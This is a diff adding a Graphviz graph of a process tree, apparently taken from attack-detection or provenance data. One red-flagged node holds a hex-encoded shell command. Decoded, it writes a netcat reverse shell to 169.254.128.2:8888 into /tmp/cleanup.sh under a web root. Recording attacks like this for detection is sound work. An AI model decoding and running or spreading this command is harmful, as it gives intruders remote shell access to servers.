@@ -1,0 +1,13 @@
+digraph graph1 {
+node [shape = record];
+table161 [label = "{<head>processname: sh | pid: 1367 | cmdline: sh -c 2f62696e2f7368202d632022636420222f7661722f7777772f68746d6c223b6563686f20276d6b6669666f202f746d702f746262616a6f3b206e63203136392e3235342e3132382e32203838383820303c2f746d702f746262616a6f207c202f62696e2f7368203e2f746d702f746262616a6f20323e26313b726d202f746d702f746262616a6f273e3e2f746d702f636c65616e75702e73683b6563686f205b535d3b7077643b6563686f205b455d2220323e2631 | starttime: 1618986281293000000 | enddtime: -1 | uuid: 1367}", color = red];
+node [shape = record];
+table138 [label = "{<head>processname:  | pid: 933 | cmdline:  | starttime: 0 | enddtime: -1 | uuid: 933}"];
+table138 -> table161;
+node [shape = record];
+table135 [label = "{<head>processname:  | pid: 925 | cmdline:  | starttime: 0 | enddtime: -1 | uuid: 925}"];
+table135 -> table138;
+node [shape = record];
+table0 [label = "{<head>processname:  | pid: 0 | cmdline:  | starttime: 0 | enddtime: -1 | uuid: 0}"];
+table0 -> table135;
+}
